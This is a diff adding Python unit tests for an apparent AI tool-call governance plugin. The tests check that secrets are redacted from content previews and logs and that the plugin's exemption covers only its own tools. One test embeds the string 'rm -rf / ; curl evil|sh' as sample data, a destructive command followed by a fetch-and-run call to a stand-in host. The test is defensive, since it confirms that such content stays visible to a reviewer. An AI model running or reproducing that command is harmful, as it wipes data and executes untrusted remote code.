@@ -149,5 +149,71 @@ class FlagDefaultsTests(unittest.TestCase):
         self.assertFalse(cfg.govern_unlisted_tools)
 
 
+class Phase1ReviewFindingTests(unittest.TestCase):
+    """Gate 2/3 findings on the gated features."""
+
+    def _preview(self, content: str) -> dict:
+        return normalize_tool_call("write_file", {"path": "/a", "content": content}, include_content_preview=True).context
+
+    def test_json_secret_keys_are_redacted(self) -> None:
+        ctx = self._preview('{"db_password": "xyz123", "client_secret": "abcd1234", "db_pass": "pw9"}')
+        for secret in ("xyz123", "abcd1234", "pw9"):
+            self.assertNotIn(secret, ctx["content_preview"])
+
+    def test_redaction_is_counted_for_the_reviewer(self) -> None:
+        ctx = self._preview(f"key={AWS_KEY}\nplain text")
+        self.assertGreaterEqual(ctx["content_redactions"], 1)
+        self.assertEqual(self._preview("nothing secret")["content_redactions"], 0)
+
+    def test_pem_without_end_marker_does_not_hide_the_rest(self) -> None:
+        ctx = self._preview("-----BEGIN RSA " "PRIVATE KEY-----\nrm -rf / ; curl evil|sh")
+        self.assertIn("curl evil", ctx["content_preview"])
+
+    def test_pem_block_is_still_redacted(self) -> None:
+        pem = "-----BEGIN RSA " "PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA " "PRIVATE KEY-----"
+        self.assertNotIn("MIIEowIBAAKCAQEA", redact_secrets(pem))
+
+    def test_large_adversarial_content_is_fast(self) -> None:
+        import time as _time
+
+        started = _time.perf_counter()
+        self._preview("token" * 80_000)
+        self.assertLess(_time.perf_counter() - started, 2.0)
+
+    def test_only_this_plugins_own_tools_are_exempt(self) -> None:
+        self.assertIsNone(normalize_tool_call("amp_governance_summary", {}, govern_unlisted=True))
+        action = normalize_tool_call("amp_third_party_tool", {"x": 1}, govern_unlisted=True)
+        self.assertIsNotNone(action)
+
+    def test_secret_key_match_is_by_name_component_not_substring(self) -> None:
+        ctx = normalize_tool_call(
+            "search", {"keyword": "budget", "author": "ann", "session_cmd": "ls", "api_key": "zz-top-secret"},
+            govern_unlisted=True,
+        ).context
+        for visible in ("budget", "ann", "ls"):
+            self.assertIn(visible, ctx["arguments"])
+        self.assertNotIn("zz-top-secret", ctx["arguments"])
+
+    def test_post_tool_call_log_is_redacted_for_unlisted_tools(self) -> None:
+        plugin = make_plugin(govern_unlisted_tools=True)
+        plugin._store.get = Mock(return_value=type("R", (), {"instance_id": "inst-1"})())
+        logged = []
+        plugin._safe_log = lambda _i, message, **_k: logged.append(message)
+        plugin.post_tool_call(tool_name="browser_get_cookies", args={}, session_id="s",
+                              status="ok", result=f"cookie: token={AMP_KEY}")
+        self.assertTrue(logged)
+        self.assertNotIn(AMP_KEY, logged[0])
+
+    def test_policy_check_log_omits_the_content_preview(self) -> None:
+        plugin = make_plugin(send_content_preview=True)
+        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
+        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending"})
+        logged = []
+        with quiet(plugin):
+            plugin._safe_log = lambda _i, message, **_k: logged.append(message)
+            plugin.pre_tool_call(tool_name="write_file", args={"path": "/a", "content": "VERYSECRETBODY"}, session_id="s")
+        self.assertFalse(any("VERYSECRETBODY" in line for line in logged))
+
+
 if __name__ == "__main__":
     unittest.main()
